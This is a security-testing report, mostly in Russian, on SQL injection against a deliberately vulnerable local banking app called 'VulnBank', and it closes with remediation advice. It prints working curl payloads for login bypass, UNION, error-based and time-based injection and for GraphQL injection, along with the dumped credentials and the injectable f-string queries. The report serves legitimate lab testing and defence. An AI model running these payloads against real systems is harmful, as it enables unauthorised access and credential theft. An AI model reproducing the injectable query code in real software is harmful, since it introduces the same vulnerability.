# Injection Testing Report: VulnBank
**Таргет:** http://localhost:5050  
**Дата:** 2026-04-12  
**Метод:** Injection skill (SQL, NoSQL, Command, SSTI)  
**БД:** PostgreSQL 13.23

---

## Сводка

| ID | Уязвимость | Endpoint | Severity | CWE | Статус |
|----|-----------|---------|---------|-----|--------|
| INJ-001 | SQL Injection Auth Bypass | POST /login | Critical | CWE-89 | ✅ Confirmed |
| INJ-002 | UNION-based SQLi → Full DB Dump | POST /login | Critical | CWE-89 | ✅ Confirmed |
| INJ-003 | Error-based SQLi → Credential Dump | POST /login | Critical | CWE-89 | ✅ Confirmed |
| INJ-004 | GraphQL Error-based SQLi | POST /graphql | Critical | CWE-89 | ✅ Confirmed |
| INJ-005 | Time-based Blind SQLi | POST /login | High | CWE-89 | ✅ Confirmed |
| INJ-006 | SSTI в bio поле | POST /update_bio | N/A | — | ❌ Not exploitable |
| INJ-007 | Command Injection | POST /upload_profile_picture_url | N/A | — | ❌ Not present |

---

## DB версия (извлечена через error-based)

```
PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on aarch64-unknown-linux-gnu,
compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit
```

---

## INJ-001: SQL Injection Auth Bypass

**Severity:** CRITICAL | **CWE:** CWE-89  
**Endpoint:** `POST /login`

**Уязвимый код** (`auth.py:120`):
```python
f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**PoC:**
```bash
curl -X POST http://localhost:5050/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'
```

**Результат:**
```json
{
  "isAdmin": true,
  "message": "Login successful",
  "token": "<admin_JWT>",
  "debug_info": {"username": "admin", "is_admin": true}
}
```

**Варианты bypass:**
```
admin'--          → вход как admin (комментирует AND password)
' OR '1'='1'--   → вход как первый пользователь в БД
' OR 1=1--        → аналогично
```

**Remediation:** Параметризованные запросы: `cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))`

---

## INJ-002: UNION-based SQLi → Full Database Dump

**Severity:** CRITICAL | **CWE:** CWE-89

**Разведка:**
- Таблица `users` имеет **10 колонок** (определено через NULL enumeration)
- Схема: `id(int), username(text), password(text), account_number(text), balance(numeric), is_admin(bool), ...`

**PoC — дамп всех пользователей:**
```bash
curl -X POST http://localhost:5050/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' UNION SELECT id,username||'|'||password||'|'||account_number||'|'||balance::text||'|'||is_admin::text,password,account_number,balance,is_admin,NULL,NULL,NULL,NULL FROM users LIMIT 1 OFFSET 0--\",\"password\":\"x\"}"
```

**Извлечённые данные (все пользователи):**
```
rich_hacker     | Rich1!     | 0707172815 | 9999999.00 | false
victim_idor     | Hacked123! | 8717432571 | -999.90    | false
admin           | admin123   | ADMIN001   | 1000000.00 | true
superadmin_test | Admin1!    | 5982795163 | 1000.00    | true
attacker_idor   | Attack3r!  | 7556229114 | 802899.90  | false
```

**Пароли в открытом виде** — хранятся без хеширования (отдельная уязвимость).

**PoC — быстрый дамп паролей через concat:**
```bash
curl -X POST http://localhost:5050/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' UNION SELECT id,username||'::::'||password,password,account_number,balance,is_admin,NULL,NULL,NULL,NULL FROM users LIMIT 1 OFFSET 0--\",\"password\":\"x\"}"
# Response username field: "admin::::admin123"
```

---

## INJ-003: Error-based SQLi → One-Query Credential Dump

**Severity:** CRITICAL | **CWE:** CWE-89

PostgreSQL раскрывает данные в error messages через `CAST(data AS integer)`.

**PoC — весь дамп одним запросом:**
```bash
curl -X POST http://localhost:5050/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)--\",\"password\":\"x\"}"
```

**Результат в поле `error`:**
```
invalid input syntax for type integer: 
"admin:admin123, superadmin_test:Admin1!, rich_hacker:Rich1!, victim_idor:Hacked123!, attacker_idor:Attack3r!"
```

**DB версия:**
```bash
# Payload: ' AND 1=CAST((SELECT version()) AS int)--
# Error: "PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on aarch64-unknown-linux-gnu..."
```

---

## INJ-004: GraphQL Error-based SQLi

**Severity:** CRITICAL | **CWE:** CWE-89  
**Endpoint:** `POST /graphql` → `transactionSummary(accountNumber: ...)`

**Уязвимый код** (`transaction_graphql.py:78`):
```python
f"SELECT id, username, account_number, is_admin FROM users WHERE account_number = '{account_number}'"
```

**PoC — дамп через GraphQL:**
```bash
curl -X POST http://localhost:5050/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d "{\"query\":\"{ transactionSummary(accountNumber: \\\"' AND 1=CAST((SELECT string_agg(username||':'||password,', ') FROM users) AS integer)--\\\") { scope } }\"}"
```

**Результат в GraphQL error:**
```json
{
  "errors": [{
    "message": "invalid input syntax for type integer: \"admin:admin123, superadmin_test:Admin1!, rich_hacker:Rich1!, victim_idor:Hacked123!, attacker_idor:Attack3r!\""
  }]
}
```

**Дополнительные SQLi точки в том же файле:**
- `transaction_graphql.py:46` — `WHERE id = {user_id}` (integer injection)
- `transaction_graphql.py:106` — `WHERE from_account = '{scoped_account_number}'`
- `transaction_graphql.py:155` — `WHERE user_id = {scoped_user_id}`

---

## INJ-005: Time-based Blind SQLi

**Severity:** HIGH | **CWE:** CWE-89

**PoC:**
```bash
# Нормальный запрос: ~50ms
# С pg_sleep(2): ~2000ms

time curl -X POST http://localhost:5050/login \
  -H "Content-Type: application/json" \
  -d "'{\"username\":\"'; SELECT pg_sleep(2)--\",\"password\":\"x\"}'"
# → 2.021 total (задержка подтверждена)
```

**Использование:** Когда прямой in-band вывод недоступен (другие endpoints без verbose errors).

---

## INJ-006: SSTI — Не эксплуатируемо

Поле `bio` сохраняется как строка. Flask/Jinja2 не рендерит bio через шаблонизатор.  
`{{7*7}}` сохраняется и возвращается буквально — без вычисления.

---

## Цепочка атаки: Anonymous → Full DB Dump (2 запроса)

```
Шаг 1: POST /login
  username: ' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)--
  password: x

→ Error response содержит:
  "admin:admin123, superadmin_test:Admin1!, victim_idor:Hacked123!, attacker_idor:Attack3r!, rich_hacker:Rich1!"

Шаг 2: POST /login
  username: admin'--
  password: x

→ Полный admin JWT токен
→ Доступ ко всем admin endpoints
```

**Итого:** Без каких-либо учётных данных атакующий за 2 curl-запроса получает:
- Все пароли в открытом виде
- Все номера счетов и балансы
- Admin JWT токен
- Полный контроль над приложением

---

## Сравнение с предыдущими методами

| Техника | Manual IDOR | Static Review | Injection Skill |
|---------|-------------|---------------|-----------------|
| Auth bypass SQLi | ❌ | ✅ (код) | ✅ **EXPLOITED** |
| UNION dump (10 cols) | ❌ | ✅ (код) | ✅ **НОВОЕ: полный дамп** |
| Error-based one-query dump | ❌ | ❌ | ✅ **НОВОЕ** |
| GraphQL SQLi | ❌ | ✅ (код) | ✅ **EXPLOITED** |
| Time-based blind | ❌ | ❌ | ✅ **НОВОЕ** |
| Plaintext пароли в БД | ❌ | ✅ (код) | ✅ **ПОДТВЕРЖДЕНО дампом** |

**3 новые техники** и **полный дамп БД** — не достигнутые ни одним предыдущим методом.

---

## Remediation

| Приоритет | Уязвимость | Исправление |
|-----------|------------|-------------|
| P0 | SQLi во всех queries | Параметризованные запросы через psycopg2 `%s` |
| P0 | Plaintext пароли | `bcrypt.hashpw(password, bcrypt.gensalt())` |
| P0 | Verbose DB errors в response | Generic error messages, логи только на сервере |
| P1 | GraphQL SQLi (4 точки) | ORM или параметризация во всех f-string queries |
| P1 | Time-based (все endpoints) | Единое исправление через параметризацию |
